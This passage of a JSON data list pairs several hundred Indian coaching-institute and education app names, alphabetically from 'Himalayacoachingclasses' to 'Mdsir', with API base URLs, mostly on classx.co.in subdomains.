        {"name": "Himalayacoachingclasses", "api": "https://himalayacoachingclassesapi.classx.co.in"},
        {"name": "Himalayaeduhub", "api": "https://himalayaeduhubapi.classx.co.in"},
        {"name": "Himankclasses", "api": "https://himankclassesapi.classx.co.in"},
        {"name": "Himanshusirclasses", "api": "https://himanshusirclassesapi.classx.co.in"},
        {"name": "Himveer", "api": "https://himveerapi.classx.co.in"},
        {"name": "Hinddefenceacademy", "api": "https://hinddefenceacademyapi.classx.co.in"},
        {"name": "Hindiadhyapak", "api": "https://hindiadhyapakapi.classx.co.in"},
        {"name": "Hindiclasses", "api": "https://hindiclassesapi.classx.co.in"},
        {"name": "Hindijoshisir", "api": "https://hindijoshisirapi.classx.co.in"},
        {"name": "Hindimaster", "api": "https://hindimasterapi.classx.co.in"},
        {"name": "Hindipoint", "api": "https://hindipointapi.classx.co.in"},
        {"name": "Hindustanclasses", "api": "https://hindustanclassesapi.classx.co.in"},
        {"name": "Historicaacademy", "api": "https://historicaacademyapi.classx.co.in"},
        {"name": "History360", "api": "https://history360api.classx.co.in"},
        {"name": "Historybychanchalsir", "api": "https://historychanchalsirapi.classx.co.in"},
        {"name": "Historybypawansir", "api": "https://historypawanapi.classx.co.in"},
        {"name": "Historybysachingulig", "api": "https://historysachinguligapi.classx.co.in"},
        {"name": "Historylok", "api": "https://historylokapi.classx.co.in"},
        {"name": "Historywithrohitsir", "api": "https://historywithrohitsirapi.classx.co.in"},
        {"name": "Hitechlearningacademy", "api": "https://hitechlearningacademyapi.classx.co.in"},
        {"name": "Hiteshsirgyankosh", "api": "https://hiteshsirgyankoshapi.classx.co.in"},
        {"name": "Homesciencehub", "api": "https://homesciencehubapi.classx.co.in"},
        {"name": "Hopeeducationjmk", "api": "https://hopeeducationjmkapi.classx.co.in"},
        {"name": "Horizoniasacademy", "api": "https://horizoniasacademyapi.classx.co.in"},
        {"name": "Hornbill", "api": "https://hornbillclassesapi.classx.co.in"},
        {"name": "Hpsuccessclasses", "api": "https://hpsuccessclassesapi.classx.co.in"},
        {"name": "Hrjprep", "api": "https://hrjprepapi.classx.co.in"},
        {"name": "Htcclassesbysksir", "api": "https://htcclassessksirapi.classx.co.in"},
        {"name": "Hundredsxdevs", "api": "https://100xdevsapi.classx.co.in"},
        {"name": "Iace", "api": "https://iaceapi.classx.co.in"},
        {"name": "Iaceonlineclasses", "api": "https://iaceonlineclassesapi.classx.co.in"},
        {"name": "Iasbabuji", "api": "https://iasbabujiapi.classx.co.in"},
        {"name": "Iasplus", "api": "https://iasplusapi.classx.co.in"},
        {"name": "Iceonline", "api": "https://iceonlineapi.classx.co.in"},
        {"name": "Icoaching", "api": "https://icoachingapi.classx.co.in"},
        {"name": "Ics", "api": "https://icsapi.classx.co.in"},
        {"name": "Icseconnect", "api": "https://icseconnectapi.classx.co.in"},
        {"name": "Idealachiever", "api": "https://idealachieverapi.classx.co.in"},
        {"name": "Idealnursingclasses", "api": "https://idealnursingclassesapi.classx.co.in"},
        {"name": "Idealonlineschool", "api": "https://idealonlineschoolapi.classx.co.in"},
        {"name": "Ignite247", "api": "https://ignite247api.classx.co.in"},
        {"name": "Ignitetuition", "api": "https://ignitetuitionapi.classx.co.in"},
        {"name": "Iitguide", "api": "https://iitguideapi.classx.co.in"},
        {"name": "Iitianconcept", "api": "https://iitianconceptapi.classx.co.in"},
        {"name": "Iitiansacademyonline", "api": "https://iitiansacademyonlineapi.classx.co.in"},
        {"name": "Ilearncenter", "api": "https://ilearncenterapi.classx.co.in"},
        {"name": "Ilmitms", "api": "https://ilmitmsapi.classx.co.in"},
        {"name": "Imfsstudyabroad", "api": "https://imfsstudyabroadapi.classx.co.in"},
        {"name": "Impetusedutech", "api": "https://impetusedutechapi.classx.co.in"},
        {"name": "Imransirmaths", "api": "https://imransirmathsapi.classx.co.in"},
        {"name": "Incredibleacademy", "api": "https://incredibleacademyapi.classx.co.in"},
        {"name": "Indiabiology", "api": "https://indiabiologyapi.classx.co.in"},
        {"name": "Indianeducator", "api": "https://indianeducatorapi.classx.co.in"},
        {"name": "Indiannews20", "api": "https://indiannews20api.classx.co.in"},
        {"name": "Indianrojgar", "api": "https://indianrojgarapi.classx.co.in"},
        {"name": "Indiashastralearningapp", "api": "https://indiashastralearningappapi.classx.co.in"},
        {"name": "Indorecscacademy", "api": "https://indorecscacademyapi.classx.co.in"},
        {"name": "Indorephysicalacademy", "api": "https://indorephysicalacademyapi.classx.co.in"},
        {"name": "Indused", "api": "https://indusedapi.classx.co.in"},
        {"name": "Infinimix", "api": "https://infinimixapi.classx.co.in"},
        {"name": "Infinityclassesjaipur", "api": "https://infinityclassesjaipurapi.classx.co.in"},
        {"name": "Infiqueclasses", "api": "https://infiqueclassesapi.classx.co.in"},
        {"name": "Informativeinstitute", "api": "https://informativeinstituteapi.classx.co.in"},
        {"name": "Infotrade", "api": "https://infotradeapi.appx.co.in"},
        {"name": "Infotrade", "api": "https://infotradeapi.classx.co.in"},
        {"name": "Ingliaacademy", "api": "https://ingliaacademyapi.classx.co.in"},
        {"name": "Inspireindiaacademy", "api": "https://inspireindiaacademyapi.classx.co.in"},
        {"name": "Inspirerasacademy", "api": "https://inspirerasacademyapi.classx.co.in"},
        {"name": "Inspiresoftskills", "api": "https://inspiresoftskillsapi.classx.co.in"},
        {"name": "Instacademy", "api": "https://instacademyapi.classx.co.in"},
        {"name": "Instituteofcomputereducation", "api": "https://institutecomputereducationapi.classx.co.in"},
        {"name": "Intelectoin", "api": "https://intelectoinapi.classx.co.in"},
        {"name": "Investaajforkal", "api": "https://investaajforkalapi.classx.co.in"},
        {"name": "Investschool", "api": "https://investschoolapi.classx.co.in"},
        {"name": "Iosreview", "api": "https://iosreviewapi.classx.co.in"},
        {"name": "Ipaperclasses", "api": "https://ipaperclassesapi.classx.co.in"},
        {"name": "Ipbuddy", "api": "https://ipbuddyapi.classx.co.in"},
        {"name": "Iqacademy", "api": "https://iqacademyapi.classx.co.in"},
        {"name": "Iqhike", "api": "https://iqhikeapi.classx.co.in"},
        {"name": "Iraias", "api": "https://iraiasapi.classx.co.in"},
        {"name": "Iriseacademy", "api": "https://iriseacademyapi.classx.co.in"},
        {"name": "Irshatech", "api": "https://irshatechapi.classx.co.in"},
        {"name": "Ischool24", "api": "https://ischool24api.classx.co.in"},
        {"name": "Itcorner", "api": "https://itcornerapi.classx.co.in"},
        {"name": "Itihasinstitution", "api": "https://itihasinstitutionapi.classx.co.in"},
        {"name": "Itpathshala", "api": "https://itpathshalaapi.classx.co.in"},
        {"name": "Itshaala", "api": "https://itshaalaapi.classx.co.in"},
        {"name": "Itspiderspune", "api": "https://itspiderspuneapi.classx.co.in"},
        {"name": "Ivaclasses", "api": "https://ivaclassesapi.classx.co.in"},
        {"name": "Jagrutawaaz", "api": "https://jagrutawaazapi.classx.co.in"},
        {"name": "Jagrutiacademy", "api": "https://jagrutiacademyapi.classx.co.in"},
        {"name": "Jaibharatonlineclasses", "api": "https://jaibharatapi.classx.co.in"},
        {"name": "Jaihostudy", "api": "https://jaihostudyapi.classx.co.in"},
        {"name": "Jaipalvishwakarma", "api": "https://jaipalvishwakarmaapi.classx.co.in"},
        {"name": "Jaipurcoachingcentre", "api": "https://jaipurcoachingcentreapi.classx.co.in"},
        {"name": "Javatechie", "api": "https://javatechieapi.classx.co.in"},
        {"name": "Jawaharnavodyavidhalaya", "api": "https://jawaharnavodayvidhalayapraveshparikshaapi.classx.co.in"},
        {"name": "Jayacademyfornursing", "api": "https://jayacademyfornursingapi.classx.co.in"},
        {"name": "Jaydurgamechanical", "api": "https://jaydurgamechanicalapi.classx.co.in"},
        {"name": "Jayramclasses", "api": "https://jayramclassesapi.classx.co.in"},
        {"name": "Jeeone", "api": "https://jeeoneapi.classx.co.in"},
        {"name": "Jeesankalplive", "api": "https://jeesankalpliveapi.classx.co.in"},
        {"name": "Jeeskool", "api": "https://jeeskoolapi.classx.co.in"},
        {"name": "Jeetendrakumar", "api": "https://jeetendrakumarapi.classx.co.in"},
        {"name": "Jeewithajay", "api": "https://jeewithajayapi.classx.co.in"},
        {"name": "Jescorer", "api": "https://jescorerapi.classx.co.in"},
        {"name": "Jhansiinstituteofcommerce", "api": "https://jhansiinstitutecommerceapi.classx.co.in"},
        {"name": "Jharpathshala", "api": "https://jharpathshalaapi.classx.co.in"},
        {"name": "Jhguru", "api": "https://jhguruapi.classx.co.in"},
        {"name": "Jiddpolicetrainingbymaheshsir", "api": "https://jiddpolicetrainingapi.classx.co.in"},
        {"name": "Jittisirclasses", "api": "https://jittisirclassesapi.classx.co.in"},
        {"name": "Jittuclasses", "api": "https://jittuclassesapi.classx.co.in"},
        {"name": "Jkcivilservices", "api": "https://jkcivilservicesapi.classx.co.in"},
        {"name": "Jkssbstudyfast", "api": "https://jkssbstudyfastapi.classx.co.in"},
        {"name": "Jkssbstudypoint", "api": "https://jkssbstudypointapi.classx.co.in"},
        {"name": "Jnanadegula", "api": "https://jnanadegulaapi.classx.co.in"},
        {"name": "Jobbadi", "api": "https://jobbadiapi.classx.co.in"},
        {"name": "Jobstarget", "api": "https://jobstargetapi.classx.co.in"},
        {"name": "Joshonlineexams", "api": "https://joshonlineexamsapi.classx.co.in"},
        {"name": "Jpiasacademy", "api": "https://jpiasacademyapi.classx.co.in"},
        {"name": "Jpmathsolutions", "api": "https://jpmathsolutionsapi.classx.co.in"},
        {"name": "Jrtutorials", "api": "https://jrtutorialsapi.classx.co.in"},
        {"name": "Jscafe", "api": "https://jscafeapi.classx.co.in"},
        {"name": "Jscivil", "api": "https://jscivilapi.classx.co.in"},
        {"name": "Jsyatra", "api": "https://jsyatraapi.classx.co.in"},
        {"name": "Jtc", "api": "https://jtcapi.classx.co.in"},
        {"name": "Jtcthelearningapp", "api": "https://jawalateachingclassesapi.classx.co.in"},
        {"name": "Judicialaddaexamprep", "api": "https://judicialaddaexamprepapi.classx.co.in"},
        {"name": "Jugalsirclasses", "api": "https://jugalsirclassesapi.classx.co.in"},
        {"name": "Junoon", "api": "https://junoonapi.classx.co.in"},
        {"name": "Juristest", "api": "https://juristestapi.classx.co.in"},
        {"name": "Justwellclasses", "api": "https://justwellclassesapi.classx.co.in"},
        {"name": "Jyotinagpal", "api": "https://jyotinagpalapi.classx.co.in"},
        {"name": "Kagr", "api": "https://kagrapi.classx.co.in"},
        {"name": "Kaivalyathewisdom", "api": "https://kaivalyathewisdomapi.classx.co.in"},
        {"name": "Kaizenacademy", "api": "https://kaizenacademyapi.classx.co.in"},
        {"name": "Kalamacademy", "api": "https://kalamacademyapi.classx.co.in"},
        {"name": "Kalamkranti", "api": "https://kalamkrantiapi.classx.co.in"},
        {"name": "Kalpenglishacademy", "api": "https://kalpenglishacademyapi.classx.co.in"},
        {"name": "Kalyanipublication", "api": "https://kalyanipublicationapi.classx.co.in"},
        {"name": "Kalyansenglishworld", "api": "https://kalyansenglishworldapi.classx.co.in"},
        {"name": "Kannadaacademy", "api": "https://kannadaacademyapi.classx.co.in"},
        {"name": "Kapilpahuja", "api": "https://kapilpahujaapi.classx.co.in"},
        {"name": "Karadcoachingclasses", "api": "https://karadcoachingclassesapi.classx.co.in"},
        {"name": "Karlapudikrishna", "api": "https://karlapudikrishnaapi.classx.co.in"},
        {"name": "Karnomatics", "api": "https://karnomaticsapi.classx.co.in"},
        {"name": "Kataralearning", "api": "https://kataralearningapi.classx.co.in"},
        {"name": "Katariaclassesnarnaul", "api": "https://katariaclassesnarnaulapi.classx.co.in"},
        {"name": "Kathaayurveda", "api": "https://kathaayurvedaapi.classx.co.in"},
        {"name": "Kauserclasses", "api": "https://kauserclassesapi.classx.co.in"},
        {"name": "Kautilyaacademy", "api": "https://kautilyaacademyapi.classx.co.in"},
        {"name": "Kautilyaacademysatara", "api": "https://kautilyaacademysataraapi.classx.co.in"},
        {"name": "Kautilyaalp", "api": "https://kautilyaalpjeapi.classx.co.in"},
        {"name": "Kautilyans", "api": "https://kautilyansapi.classx.co.in"},
        {"name": "Kaydepanditlawacademy", "api": "https://kaydepanditlawacademyapi.classx.co.in"},
        {"name": "Kazisironlinecoaching", "api": "https://kazisironlinecoachingapi.classx.co.in"},
        {"name": "Kccoaching", "api": "https://kccoachingapi.classx.co.in"},
        {"name": "Keertipurswani", "api": "https://keertipurswaniapi.classx.co.in"},
        {"name": "Kelvinlive", "api": "https://kelvinliveapi.classx.co.in"},
        {"name": "Kelwinthelearningapp", "api": "https://kelwinlearningapi.classx.co.in"},
        {"name": "Kendretestseries", "api": "https://kendretestseriesapi.classx.co.in"},
        {"name": "Keyofsuccess", "api": "https://keyofsuccessapi.classx.co.in"},
        {"name": "Kgf", "api": "https://kgfapi.classx.co.in"},
        {"name": "Kgmmission", "api": "https://kgmmissionapi.classx.co.in"},
        {"name": "Kgskautilyagroupofstudies", "api": "https://kgskautilyagroupstudiesapi.classx.co.in"},
        {"name": "Khantimethod", "api": "https://khantimethodapi.classx.co.in"},
        {"name": "Kharatacademy", "api": "https://kharatacademyapi.classx.co.in"},
        {"name": "Khuranastudyofficial", "api": "https://khuranastudyofficialapi.classx.co.in"},
        {"name": "Kico", "api": "https://kicoappapi.classx.co.in"},
        {"name": "Kinjallearning", "api": "https://kinjallearningapi.classx.co.in"},
        {"name": "Kiranacademy", "api": "https://kiranacademyapi.classx.co.in"},
        {"name": "Kiranguruji", "api": "https://kirangurujiapi.classx.co.in"},
        {"name": "Kiroshaacademy", "api": "https://kiroshaacademyapi.classx.co.in"},
        {"name": "Kiswacareeracademy", "api": "https://kiswacareeracademyapi.akamai.net.in"},
        {"name": "Kjwisdomclasses", "api": "https://kjwisdomclassesapi.classx.co.in"},
        {"name": "Kmdsaharanpur", "api": "https://kmdsaharanpurapi.classx.co.in"},
        {"name": "Kmenglishclasses", "api": "https://kmenglishclassesapi.classx.co.in"},
        {"name": "Knowledgeaccount", "api": "https://knowledgeaccountapi.classx.co.in"},
        {"name": "Knowledgebeam", "api": "https://knowledgebeamapi.classx.co.in"},
        {"name": "Knowledgebox", "api": "https://knowledgeboxapi.classx.co.in"},
        {"name": "Knowledgetopking20", "api": "https://knowledgetopkingapi.classx.co.in"},
        {"name": "Knrlogics", "api": "https://knrlogicsapi.classx.co.in"},
        {"name": "Komyaeducation", "api": "https://komyaeducationapi.classx.co.in"},
        {"name": "Konsacollegecollegesetu", "api": "https://konsacollegeapi.classx.co.in"},
        {"name": "Kotputlilaweducation", "api": "https://kotputlilaweducationapi.classx.co.in"},
        {"name": "Kpsirsbiologyclasses", "api": "https://kpsirbiologyclassesapi.classx.co.in"},
        {"name": "Kredozthelearningapp", "api": "https://kredozlearningapi.classx.co.in"},
        {"name": "Kreduhub", "api": "https://kreduhubapi.classx.co.in"},
        {"name": "Krishinteducation", "api": "https://krishinteducationapi.classx.co.in"},
        {"name": "Krishiparikshaicaribpsupsccuetexametc", "api": "https://krishiparikshaapi.classx.co.in"},
        {"name": "Krishnaclasses", "api": "https://krishnaclassesapi.classx.co.in"},
        {"name": "Krishnacoachingcentre", "api": "https://krishnacoachingcentreapi.classx.co.in"},
        {"name": "Krishnamindset", "api": "https://krishnamindsetapi.classx.co.in"},
        {"name": "Krisshhnachemistryclasses", "api": "https://krisshnachemistryclassesapi.classx.co.in"},
        {"name": "Krushikingsagriacademy", "api": "https://krushikingsagriacademyapi.classx.co.in"},
        {"name": "Krushnamacedmyrajkot", "api": "https://krushnamacedmyrajkotapi.classx.co.in"},
        {"name": "Kskeducare", "api": "https://kskeducareapi.classx.co.in"},
        {"name": "Ksquare", "api": "https://ksquareapi.classx.co.in"},
        {"name": "Ktdtonline", "api": "https://ktdtonlineeducationapi.teachx.in"},
        {"name": "Ktdtonlineeducation", "api": "https://ktdtonlineeducationapi.classx.co.in"},
        {"name": "Kumaredutainment", "api": "https://kumaredutainmentapi.classx.co.in"},
        {"name": "Kumawatgs", "api": "https://kumawatgsapi.classx.co.in"},
        {"name": "Kumawattarunsir", "api": "https://kumawattarunsirapi.classx.co.in"},
        {"name": "Kundankishore", "api": "https://kundankishoreapi.classx.co.in"},
        {"name": "Kvclasses", "api": "https://kvclassesapi.classx.co.in"},
        {"name": "Kvkfoundation", "api": "https://kvkfoundationapi.classx.co.in"},
        {"name": "Lakshacademy", "api": "https://lakshacademyapi.classx.co.in"},
        {"name": "Lakshmimaths", "api": "https://lakshmimathsapi.classx.co.in"},
        {"name": "Lakshya", "api": "https://lakshyaclassesapi.appx.co.in"},
        {"name": "Lakshyaacademyahmednagar", "api": "https://lakshyaacademyahmednagarapi.classx.co.in"},
        {"name": "Lakshyaacademyjharkand", "api": "https://lakshyaacademyjharkhandapi.classx.co.in"},
        {"name": "Lakshyaclasses", "api": "https://lakshyaclassesapi.classx.co.in"},
        {"name": "Lakshyaclassesofficial", "api": "https://lakshyaclassesofficialapi.classx.co.in"},
        {"name": "Lakshyaclassesold", "api": "https://lakshyaclassesapi.classx.co.in"},
        {"name": "Lakshyagyananant", "api": "https://lakshyagyananantapi.classx.co.in"},
        {"name": "Lakshyaias", "api": "https://lakshyagscrackerapi.classx.co.in"},
        {"name": "Lakshyaias", "api": "https://lakshyaiasapi.classx.co.in"},
        {"name": "Lakshyamarathi", "api": "https://lakshyamarathiapi.classx.co.in"},
        {"name": "Lakshyaras", "api": "https://lakshyarasapi.classx.co.in"},
        {"name": "Lastexam", "api": "https://lastexamapi.classx.co.in"},
        {"name": "Lastmomentpadhai", "api": "https://lastmomentpadhaiapi.classx.co.in"},
        {"name": "Lawchamps", "api": "https://lawchampsapi.classx.co.in"},
        {"name": "Lawislife", "api": "https://lawlifeapi.classx.co.in"},
        {"name": "Lawlectures", "api": "https://lawlecturesapi.classx.co.in"},
        {"name": "Lawshalabyhalfpacelearnatyourownpace", "api": "https://lawshalaapi.classx.co.in"},
        {"name": "Laxaneducation", "api": "https://laxaneducationapi.classx.co.in"},
        {"name": "Learn247", "api": "https://learn247api.classx.co.in"},
        {"name": "Learn4Exam", "api": "https://learn4examapi.classx.co.in"},
        {"name": "Learnamanbarkhastudylab", "api": "https://learnamanbarkhaapi.classx.co.in"},
        {"name": "Learnandshare", "api": "https://learnshareapi.classx.co.in"},
        {"name": "Learnbyinvestt", "api": "https://learninvesttapi.classx.co.in"},
        {"name": "Learncodewithtechnicalsuneja", "api": "https://learncodetechnicalsunejaapi.classx.co.in"},
        {"name": "Learnhistorybychauhansir", "api": "https://learnhistorychauhansirapi.classx.co.in"},
        {"name": "Learnindia", "api": "https://learnindiaapi.classx.co.in"},
        {"name": "Learningadda", "api": "https://learningaddaapi.classx.co.in"},
        {"name": "Learningclasses", "api": "https://learningclassesapi.classx.co.in"},
        {"name": "Learningloop", "api": "https://learningloopapi.classx.co.in"},
        {"name": "Learningpocket", "api": "https://learningpocketapi.classx.co.in"},
        {"name": "Learningtimetelugu", "api": "https://learningtimeteluguapi.classx.co.in"},
        {"name": "Learningzone", "api": "https://learningzoneapi.classx.co.in"},
        {"name": "Learnmantra", "api": "https://learnmantraapi.classx.co.in"},
        {"name": "Learnwithchirag", "api": "https://learnchiragapi.classx.co.in"},
        {"name": "Learnwithnatarajupsc", "api": "https://learnwithnatarajupscapi.classx.co.in"},
        {"name": "Learnwithpts", "api": "https://learnwithptsapi.classx.co.in"},
        {"name": "Learnwithsumit", "api": "https://learnwithsumitapi.classx.co.in"},
        {"name": "Learnwithsweety", "api": "https://learnsweetyapi.classx.co.in"},
        {"name": "Learnwithvipul", "api": "https://learnwithvipulapi.classx.co.in"},
        {"name": "Leaverageconsultants", "api": "https://leverageconsultantsapi.classx.co.in"},
        {"name": "Legalpathshalabykaransangwan", "api": "https://legalpathshalakaransangwanapi.classx.co.in"},
        {"name": "Lernax", "api": "https://learnxapi.classx.co.in"},
        {"name": "Letsimprove", "api": "https://letsimproveapi.classx.co.in"},
        {"name": "Letslearn", "api": "https://letslearnappapi.classx.co.in"},
        {"name": "Letslearnwithajaysir", "api": "https://letslearnajaysirapi.classx.co.in"},
        {"name": "Levelup", "api": "https://levelupapi.classx.co.in"},
        {"name": "Levelupenglishwithramani", "api": "https://levelupenglishramaniapi.classx.co.in"},
        {"name": "Librsclasses", "api": "https://librsclassesapi.classx.co.in"},
        {"name": "Lifeguru", "api": "https://lifeguruapi.classx.co.in"},
        {"name": "Lifeskillsbyalmost", "api": "https://lifeskillsalmostapi.classx.co.in"},
        {"name": "Lifetimecourses", "api": "https://lifetimecoursesapi.classx.co.in"},
        {"name": "Lifexcareer", "api": "https://lifexcareerapi.classx.co.in"},
        {"name": "Linkinglaws", "api": "https://linkinglawsapi.classx.co.in"},
        {"name": "Liso", "api": "https://lisoclassesapi.classx.co.in"},
        {"name": "Listenup", "api": "https://listenupapi.classx.co.in"},
        {"name": "Littlecodershub", "api": "https://littlecodershubapi.classx.co.in"},
        {"name": "Livedoubts", "api": "https://livedoubtsapi.classx.co.in"},
        {"name": "Livereasoningbyshobhitsir", "api": "https://samarpanliveapi.classx.co.in"},
        {"name": "Lngeducation", "api": "https://lngeducationapi.classx.co.in"},
        {"name": "Logicalmindeducation", "api": "https://logicalmindapi.classx.co.in"},
        {"name": "Loginstudy", "api": "https://loginstudyapi.classx.co.in"},
        {"name": "Lokmanyaias", "api": "https://lokmanyaiasapi.classx.co.in"},
        {"name": "Loksevaacademypublicationbook", "api": "https://loksevaacademypublicationbookapi.classx.co.in"},
        {"name": "Lol", "api": "https://learnonlineapi.classx.co.in"},
        {"name": "Lovebabbar", "api": "https://lovebabarapi.classx.co.in"},
        {"name": "Ltrammanoharsinghintercollege", "api": "https://rammanoharsinghintercollegeapi.classx.co.in"},
        {"name": "Lucidacademy", "api": "https://lucidacademyapi.classx.co.in"},
        {"name": "Luckyenglish", "api": "https://luckyenglishapi.classx.co.in"},
        {"name": "Lvclasses", "api": "https://lvclassesapi.classx.co.in"},
        {"name": "Lvclasseslive", "api": "https://lvclassesapi.classx.co.in"},
        {"name": "Lvias", "api": "https://lviasapi.classx.co.in"},
        {"name": "Maarulaclasses", "api": "https://maarulaclassesapi.classx.co.in"},
        {"name": "Madhuramhindipro", "api": "https://madhuramhindiproapi.classx.co.in"},
        {"name": "Madhurikhedekar", "api": "https://madhurikhedekarapi.classx.co.in"},
        {"name": "Madlearning", "api": "https://madlearningapi.classx.co.in"},
        {"name": "Magadhsciencecoaching", "api": "https://magadhsciencecoachingapi.classx.co.in"},
        {"name": "Maggamworks", "api": "https://maggamworksapi.classx.co.in"},
        {"name": "Mahabharti", "api": "https://mahabhartiapi.classx.co.in"},
        {"name": "Mahajyotidnyanjyoti", "api": "https://mahajyotidnyanjyotiapi.classx.co.in"},
        {"name": "Maharanapratapacademypune", "api": "https://maharanapratapacademypuneapi.classx.co.in"},
        {"name": "Maharanapratapdefenceacademy", "api": "https://maharanapratapdefenceacademyapi.classx.co.in"},
        {"name": "Maharashtraacademy", "api": "https://maharashtraacademypuneapi.classx.co.in"},
        {"name": "Maharashtraayurvedaacademy", "api": "https://maharashtraayurvedaacademyapi.classx.co.in"},
        {"name": "Maharashtraprabodhini", "api": "https://maharashtraprabodhiniapi.classx.co.in"},
        {"name": "Maharshiacademy", "api": "https://maharshiacademyapi.classx.co.in"},
        {"name": "Mahateacher", "api": "https://mahateacherapi.classx.co.in"},
        {"name": "Mahatestmpsc", "api": "https://mahatestmpscapi.classx.co.in"},
        {"name": "Mahatmajieducator", "api": "https://mahatmajieducatorapi.classx.co.in"},
        {"name": "Mahatmajitechnical", "api": "https://mahatmajitechnicalapi.classx.co.in"},
        {"name": "Mahaveersanskrit", "api": "https://mahaveersanskritapi.classx.co.in"},
        {"name": "Mahavirpublisheranddistributors", "api": "https://mahavirpublisherdistributorsapi.classx.co.in"},
        {"name": "Maheshpatil", "api": "https://maheshpatilshashwatacademyapi.classx.co.in"},
        {"name": "Maheshramharichobe", "api": "https://maheshramharichobeapi.classx.co.in"},
        {"name": "Maheshstudies", "api": "https://maheshstudiesapi.classx.co.in"},
        {"name": "Mahiyapathsala", "api": "https://mahiyapathshalaapi.classx.co.in"},
        {"name": "Mahiyapathshalaschool", "api": "https://mahiyapathshalaschoolapi.classx.co.in"},
        {"name": "Maithilboy", "api": "https://maithilboyapi.classx.co.in"},
        {"name": "Maitreyaupscmpsc", "api": "https://maitreyaupscmpscapi.classx.co.in"},
        {"name": "Majesticacademy", "api": "https://majesticacademyapi.classx.co.in"},
        {"name": "Makecareer", "api": "https://makecareerapi.classx.co.in"},
        {"name": "Makeiasofficial", "api": "https://makeiasapi.classx.co.in"},
        {"name": "Makeiteasy", "api": "https://makeiteasyapi.classx.co.in"},
        {"name": "Makeiteasyskills", "api": "https://makeiteasyskillsapi.classx.co.in"},
        {"name": "Malikdefenseacademy", "api": "https://malikdefenseacademyapi.classx.co.in"},
        {"name": "Malindatech", "api": "https://malindatechapi.classx.co.in"},
        {"name": "Mallamcreations", "api": "https://mallamcreationsapi.classx.co.in"},
        {"name": "Malukaias", "api": "https://malukaiasapi.classx.co.in"},
        {"name": "Mamtatechnicalclasses", "api": "https://mamtatechnicalclassesapi.classx.co.in"},
        {"name": "Manaacademy", "api": "https://manaacademyapi.classx.co.in"},
        {"name": "Manapatashala", "api": "https://manapatashalaapi.classx.co.in"},
        {"name": "Manasacademy", "api": "https://manasacademyapi.classx.co.in"},
        {"name": "Manasurjaayurveda", "api": "https://manasurjaayurvedaapi.classx.co.in"},
        {"name": "Manekshawofficersacademy", "api": "https://manekshawofficersacademyapi.classx.co.in"},
        {"name": "Mangaranilessons", "api": "https://kmangaranilessonsapi.classx.co.in"},
        {"name": "Mangilalchoudharysir", "api": "https://mangilalchoudharysirapi.classx.co.in"},
        {"name": "Manishacademylive", "api": "https://manishacademyliveapi.classx.co.in"},
        {"name": "Manishvermaclasses", "api": "https://manishvermaclassesapi.classx.co.in"},
        {"name": "Manojacademy", "api": "https://manojacademyapi.classx.co.in"},
        {"name": "Manojstudycentre", "api": "https://manojstudycentreapi.classx.co.in"},
        {"name": "Mansimahilaaudyogikutpadak", "api": "https://mansimahilaaudyogikutpadaksahakarisocietyldtapi.classx.co.in"},
        {"name": "Marathuvyakaran", "api": "https://marathivyakarnapi.classx.co.in"},
        {"name": "Margdarshanpathshala", "api": "https://margdarshanpathshalaapi.classx.co.in"},
        {"name": "Marshalcareeracademy", "api": "https://marshalcareeracademyapi.classx.co.in"},
        {"name": "Maryadaqualityeducation", "api": "https://maryadaqualityeducationapi.classx.co.in"},
        {"name": "Masterclassesiaspcs", "api": "https://masterclassesiaspcsapi.classx.co.in"},
        {"name": "Masterji", "api": "https://masterjiapi.classx.co.in"},
        {"name": "Mastermindsforcaandcma", "api": "https://mastermindsforcaandcmaapi.classx.co.in"},
        {"name": "Mastersahab", "api": "https://mastersahabapi.classx.co.in"},
        {"name": "Mathematicsstarclasses", "api": "https://mathematicsstarclassesapi.classx.co.in"},
        {"name": "Mathematicswithvishalkumar", "api": "https://mathematicsvishalkumarapi.classx.co.in"},
        {"name": "Mathreasoningbykadamsir", "api": "https://mathreasoningkadamsirapi.classx.co.in"},
        {"name": "Mathsbazaar", "api": "https://mathsbazaarapi.classx.co.in"},
        {"name": "Mathsbymrksir", "api": "https://mathsmrksirapi.classx.co.in"},
        {"name": "Mathsbynitinsir", "api": "https://mathsnitinsirapi.classx.co.in"},
        {"name": "Mathscare", "api": "https://mathscareapi.classx.co.in"},
        {"name": "Mathscaredigital", "api": "https://mathscaredigitalapi.classx.co.in"},
        {"name": "Mathsfied", "api": "https://mathsfiedapi.classx.co.in"},
        {"name": "Mathsguru", "api": "https://mathsguruapi.classx.co.in"},
        {"name": "Mathsimpact", "api": "https://mathsimpactapi.classx.co.in"},
        {"name": "Mathsjugadsemjs", "api": "https://mathsjugadapi.classx.co.in"},
        {"name": "Mathskiduniyavivekchoudhary", "api": "https://mathskiduniyavivekchoudharyapi.classx.co.in"},
        {"name": "Mathsmantra", "api": "https://mathsmantraapi.classx.co.in"},
        {"name": "Mathsmastibyvipinsir", "api": "https://mathsmastivipinsirapi.classx.co.in"},
        {"name": "Mathsmirror", "api": "https://mathsmirrorapi.classx.co.in"},
        {"name": "Mathsphobia", "api": "https://mathsphobiaapi.classx.co.in"},
        {"name": "Mathsvalaashishkumar", "api": "https://mathsvalaashishkumarapi.classx.co.in"},
        {"name": "Mathsvatika20", "api": "https://mathsvatikaappapi.classx.co.in"},
        {"name": "Mathswalamaster", "api": "https://mathswalamasterapi.classx.co.in"},
        {"name": "Mathswithgajanand", "api": "https://mathsgajanandapi.classx.co.in"},
        {"name": "Mathswithvivek", "api": "https://mathsvivekapi.classx.co.in"},
        {"name": "Mathwithpraveenbajpai", "api": "https://mathpraveenbajpaiapi.classx.co.in"},
        {"name": "Matsciodia", "api": "https://matsciodiaapi.classx.co.in"},
        {"name": "Maviacademy", "api": "https://maviacademyapi.classx.co.in"},
        {"name": "Mawanaclasses", "api": "https://mawanaclassesapi.classx.co.in"},
        {"name": "Maxenglishpoint", "api": "https://maxenglishpointapi.classx.co.in"},
        {"name": "Mayastheschoolofbeauty", "api": "https://mayasschoolbeautyapi.classx.co.in"},
        {"name": "Mayboliprabodhinipune", "api": "https://mayboliprabodhiniapi.classx.co.in"},
        {"name": "Mbnbyneerajkukreja", "api": "https://mbnbyneerajkukrejaapi.classx.co.in"},
        {"name": "Mcmaworldofengineering", "api": "https://mcmaworldengineeringapi.classx.co.in"},
        {"name": "Mcmpatna", "api": "https://mcmpatnaapi.classx.co.in"},
        {"name": "Mcsiasmissioncivilservices", "api": "https://mcsiasapi.classx.co.in"},
        {"name": "Md", "api": "https://mdclassesapi.appx.co.in"},
        {"name": "Mdclasses", "api": "https://mdclassesapi.classx.co.in"},
        {"name": "Mdsir", "api": "https://mdsirapi.classx.co.in"},
